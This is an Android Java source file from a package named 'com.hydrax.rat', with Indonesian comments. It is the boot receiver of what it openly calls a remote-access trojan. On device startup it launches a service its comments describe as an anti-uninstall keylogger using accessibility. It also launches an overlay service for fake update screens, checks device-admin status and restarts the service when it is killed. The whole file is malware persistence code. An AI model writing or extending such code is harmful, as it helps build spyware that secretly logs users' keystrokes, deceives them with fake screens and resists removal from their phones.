package com.hydrax.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (action == null) return;

        // Auto-start setelah boot
        if (action.equals(Intent.ACTION_BOOT_COMPLETED) ||
            action.equals("android.intent.action.QUICKBOOT_POWERON") ||
            action.equals("com.htc.intent.action.QUICKBOOT_POWERON")) {

            // Mulai HydraService (Accessibility Service - anti-uninstall, keylogger)
            Intent hydraIntent = new Intent(context, HydraService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(hydraIntent);
            } else {
                context.startService(hydraIntent);
            }

            // Mulai OverlayService (untuk overlay, banner, fake update)
            Intent overlayIntent = new Intent(context, OverlayService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(overlayIntent);
            } else {
                context.startService(overlayIntent);
            }

            // Cek Device Admin status
            // Kalau belum aktif, coba aktifkan ulang
            if (!HydraAdminReceiver.isAdminActive(context)) {
                // Device admin tidak aktif — coba re-activate
                // Ini akan trigger onDisabled() di HydraAdminReceiver
            }
        }

        // Jika ada intent untuk restart service (dari HydraService onDestroy)
        if (action.equals("com.hydrax.rat.RESTART_SERVICE")) {
            Intent hydraIntent = new Intent(context, HydraService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(hydraIntent);
            } else {
                context.startService(hydraIntent);
            }
        }
    }
}
